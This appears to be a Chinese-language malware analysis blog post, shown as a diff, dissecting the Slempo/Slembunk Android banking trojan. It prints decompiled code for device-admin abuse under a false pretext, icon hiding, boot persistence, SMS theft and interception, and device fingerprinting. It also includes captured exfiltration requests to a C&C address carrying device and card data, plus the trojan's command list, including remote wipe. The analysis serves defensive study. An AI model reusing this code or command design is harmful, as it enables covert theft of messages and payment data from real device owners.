-<p>##1.2 设备管理员权限<br>获取设备管理员权限，如果没有设备管理员则申请，它会弹出一个界面供用户确认，DEVICE_ADMIN是相应的组件，ADD_EXPLANTION给用户的解释说明<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">public void checkDeviceAdmin() &#123;</div><div class="line">        ComponentName v0 = new ComponentName((( Context)this ), MyDeviceAdminReceiver.class );</div><div class="line">        if(!this .deviceManager. isAdminActive(v0)) &#123;</div><div class="line">            Intent v1 = new Intent( "android.app.action.ADD_DEVICE_ADMIN" );</div><div class="line">            v1. putExtra("android.app.extra.DEVICE_ADMIN" , ((Parcelable) v0));</div><div class="line">            v1. putExtra("android.app.extra.ADD_EXPLANATION" , "Get video codec access");</div><div class="line">            this.startActivity (v1 );</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line">##1.3 隐藏图标</div><div class="line">等用户安装完该应用，激活设备管理权限之后，会隐藏图标,比较有意思的隐藏图标的代码有一小段隐藏代码，对于smali可能不好阅读，但是反编译成java之后，这代码就是小菜一碟。</div><div class="line">```java</div><div class="line">if(("3". equals("3")) || ( "3" .equals( "1" ))) &#123;</div><div class="line">            this.getPackageManager ().setComponentEnabledSetting (new ComponentName(((Context )this), Main</div><div class="line">                    . class), 2 , 1);</div><div class="line">``` </div><div class="line">##1.4 计划任务</div><div class="line"></div><div class="line">```java</div><div class="line">private void scheduleLaunch() &#123;</div><div class="line">        Calendar v0 = Calendar .getInstance ();</div><div class="line">        v0. add( 12, this .restartTimeMinutes);</div><div class="line">        Intent v1 = new Intent( "com.slempo.service.activities.HTMLStart" );</div><div class="line">        v1. putExtra("values" , this. getIntent().getStringExtra ("values"));</div><div class="line">        this.am .set (0, v0. getTimeInMillis(), PendingIntent.getBroadcast (((Context) this), 0 , v1 , 0));</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line"></div><div class="line">##1.5获取运行的应用</div><div class="line">slembunk木马会根据当前正在运行的应用来决定是否启用信用卡欺骗页面</div><div class="line">```java</div><div class="line">    private String getTopRunning() &#123;</div><div class="line">        List v1 = this .getSystemService ("activity"). getRunningTasks(1 );</div><div class="line">        String v3 = !v1.isEmpty() ? v1.get(0 ).topActivity. getPackageName() : "" ;</div><div class="line">        return v3;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line">##1.6 获取短信记录</div><div class="line">```java</div><div class="line">public static String readMessagesFromDeviceDB (Context context) &#123;</div><div class="line">        Cursor v8;</div><div class="line">        Uri v1 = Uri .parse ("content://sms/inbox");</div><div class="line">        String[] v2 = new String[]&#123; "_id", "address" , "body", "date"&#125;;</div><div class="line">        JSONArray v12 = new JSONArray();</div><div class="line">        try &#123;</div><div class="line">            v8 = context.getContentResolver ().query (v1 , v2 , null, null, null );</div><div class="line">            if(v8 != null ) &#123;</div><div class="line">                if(!v8.moveToFirst ()) &#123;</div><div class="line">                    goto label_55 ;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                do &#123;</div><div class="line">                    String v6 = v8.getString(v8.getColumnIndex ("address"));</div><div class="line">                    String v7 = v8.getString(v8.getColumnIndex ("body"));</div><div class="line">                    String v9 = new SimpleDateFormat( "dd-MM-yyyy HH:mm:ss" , Locale.US ).format (new Date(</div><div class="line">                            Long.parseLong(v8.getString(v8.getColumnIndex ("date")))));</div><div class="line">                    JSONObject v13 = new JSONObject();</div><div class="line">                    v13. put( "from", v6);</div><div class="line">                    v13. put( "body", v7);</div><div class="line">                    v13. put( "date", v9);</div><div class="line">                    v12. put( v13);</div><div class="line">                    if(v8.moveToNext ()) &#123;</div><div class="line">                        continue;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    break;</div><div class="line">                &#125;</div><div class="line">                while(true );</div><div class="line">            &#125;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
-<p>##1.6获取电话号码<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">public static String getPhoneNumber(Context context ) &#123;</div><div class="line">        String v0 = context.getSystemService ("phone"). getLine1Number();</div><div class="line">        if(v0 == null || (v0. equals("" ))) &#123;</div><div class="line">            v0 = "";</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return v0;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line"></div><div class="line">##1.7 获取DeviceID</div><div class="line">```java</div><div class="line">  public static String getDeviceId (Context context) &#123;</div><div class="line">        String v1;</div><div class="line">        String v0 = context.getSystemService ("phone"). getDeviceId();</div><div class="line">        if((v0.equals("" )) || v0 == null || (v0.equals("000000000000000" ))) &#123;</div><div class="line">            v0 = Settings$Secure.getString(context.getContentResolver (), "android_id" );</div><div class="line">            if(v0 != null &amp;&amp; !v0. equals("" )) &#123;</div><div class="line">                return v0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            v0 = Build.SERIAL ;</div><div class="line">            if(v0 != null &amp;&amp; !v0. equals("" ) &amp;&amp; !v0. equalsIgnoreCase("unknown" )) &#123;</div><div class="line">                return v0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            v1 = "not available";</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            v1 = v0;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return v1;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
-<p>##1.8 设置开机启动<br>木马会被设置成开机启动并且监听外部sd卡，当sd卡准备好之后也会被启动。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:enabled</span>=<span class="string">"true "</span> <span class="attr">android:exported</span>=<span class="string">" true"</span> <span class="attr">android:name</span>=<span class="string">".reiujdksmcoiwerj "</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE "</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:enabled</span>=<span class="string">"true "</span> <span class="attr">android:exported</span>=<span class="string">" true"</span> <span class="attr">android:name</span>=<span class="string">".hujnkij8uijkjlmj "</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.BOOT_COMPLETED "</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>##1.9 监听短信<br>木马通过短信下发cc指令,从如下AndroidMenifest.xml部分文件可看出，木马对短信应用进行监听，并且权限高于系统短信应用。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt; <span class="attr">receiver</span> <span class="attr">android:enabled</span> =<span class="string">"true"</span> <span class="attr">android:exported</span>=<span class="string">"true "</span> <span class="attr">android:name</span>=<span class="string">".riejkmdcwepoksmieru "</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">"999 "</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.provider.Telephony.SMS_RECEIVED "</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div><div class="line">``` </div><div class="line">下面是recevier的onReceive方法：</div><div class="line">```java</div><div class="line">    public void onReceive(Context context, Intent intent ) &#123;</div><div class="line">        SharedPreferences v8 = context.getSharedPreferences ("AppPrefs", 0);</div><div class="line">        new HashSet ();</div><div class="line">        try &#123;</div><div class="line">            Object v1 = DATAWraper .deserialize (v8 .getString ("BLOCKED_NUMBERS", DATAWraper.serialize(</div><div class="line">                    new HashSet ())));</div><div class="line">        &#125;</div><div class="line">        catch(Exception v2 ) &#123;</div><div class="line">            v2. printStackTrace();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        Map v3 = SendSMSRecevier .retrieveMessages (intent );</div><div class="line">        Iterator v10 = v3.keySet().iterator ();</div><div class="line">        while(v10.hasNext()) &#123;</div><div class="line">            Object v7 = v10.next();</div><div class="line">            CommandCenter v6 = new CommandCenter( v3. get( v7), "", context);</div><div class="line">            if(v6.processCommand ()) &#123;</div><div class="line">                this.abortBroadcast ();</div><div class="line">                continue;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            boolean v4 = v6.needToInterceptIncoming ();</div><div class="line">            boolean v5 = v6.needToListen ();</div><div class="line">            if(!v4 &amp;&amp; !((HashSet )v1 ).contains (v7 )) &#123;</div><div class="line">                if(!v5) &#123;</div><div class="line">                    continue;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                SendData.sendListenedIncomingSMS (context , v3 .get (v7 ), ((String)v7));</div><div class="line">                continue;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            SendData.sendInterceptedIncomingSMS (context , v3 .get (v7 ), ((String)v7));</div><div class="line">            this.abortBroadcast ();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line"></div><div class="line">#2 木马工作流程</div><div class="line">木马在AndroidManifest.xml中监听了SMS_RECEIVED，ACTION_EXTERNAL_APPLICATIONS_AVAILABLE，BOOT_COMPLETED，DEVICE_ADMIN_ENABLED，com.slempo.service.activities.HTMLStart这五个action，同时注册了几个activity和一个service，除主activity外，其他都是一些欺骗页面，service则负责启动相应activity，请求设备管理权限等。下面简单看下代码流程：</div><div class="line">![][1]</div><div class="line">在main activity中会启动MainServiceStart服务，这个服务会启动三个线程周期性轮询，判断当前应用启动伪信用卡界面；请求deviceAdmin权限；判断指令启动相应的伪界面；发送电话，ime等敏感信息。发送敏感信息的请求如下：</div></pre></td></tr></table></figure></p>
-<p>POST / HTTP/1.1<br>Content-Length: 481<br>Content-Type: text/plain; charset=UTF-8<br>Host: 181.174.164.25:2080<br>Connection: Keep-Alive<br>User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)</p>
-<p>{“os”:”4.0.4”,”model”:”Unknown sdk”,”phone number”:”15555215554”,”apps”:[“com.android.gesture.builder”,”com.android.widgetpreview”,”com.example.android.apis”,”com.example.android.livecubes”,”com.example.android.softkeyboard”,”com.joeykrim.rootcheck”,”de.robv.android.xposed.installer”,”de.robv.android.xposed.installer.staticbusybox”,”eu.chainfire.supersu”,”org.slempo.service”],”imei”:”8f986e65d50f299a”,”client number”:”3”,”type”:”device info”,”operator”:”310260”,”country”:”US”}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">前面也说到了木马会根据当前正在运行的应用来决定是否启动伪信用卡页面，伪界面如下</div><div class="line">![添加信用卡][2]</div><div class="line">![添加详细信息][3]</div><div class="line">木马作者对上述用户信息做了严格校验，首先是信用卡信息必须合法，其次过期时间必须在2014到2020年之间，到了信用卡地址信息页面，对邮政编码和电话号码做了严格的关联，用户填完所有信息之后就会发送给c&amp;c主机，请求如下：</div></pre></td></tr></table></figure></p>
-<p>POST / HTTP/1.1<br>Content-Length: 401<br>Content-Type: text/plain; charset=UTF-8<br>Host: 181.174.164.25:2080<br>Connection: Keep-Alive<br>User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)</p>
-<p>{“data”:{“additional information”:{“old vbv password”:”123456”,”vbv password”:”qwerty”},”type”:”card information”,”card”:{“cvc”:”393”,”month”:”12”,”year”:”15”,”number”:”4024 0238 6573 0515”},”billing address”:{“date of birth”:”01.03.1990”,”phone number”:”212-925-2355”,”street address”:”dalianganjinzi”,”zip code”:”10002”,”phone prefix”:”+1”,”name on card”:”Zhanghua”}},”type”:”user data”,”code”:”-1”}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">附录 c&amp;c指令</div></pre></td></tr></table></figure></p>
-<p>CommandCenter.commands. add(“#intercept_sms_start”);<br>CommandCenter.commands .add (“#intercept_sms_stop”)<br>CommandCenter.commands .add (“#block_numbers”);<br>CommandCenter.commands .add (“#unblock_all_numbers”);<br>CommandCenter.commands .add (“#unblock_numbers”);<br>CommandCenter.commands .add (“#lock”);<br>CommandCenter.commands .add (“#unlock”);<br>CommandCenter.commands .add (“#send” + “_sms”);<br>CommandCenter.commands .add (“#forward” + “_calls”);<br>CommandCenter.commands .add (“#disable_forward_calls”);<br>CommandCenter.commands .add (“#control_number”);<br>CommandCenter.commands .add (“#update_html”);<br>CommandCenter.commands .add (“#show_html”);<br>CommandCenter.commands .add (“#wipe_data”);<br>```</p>
 
           
         
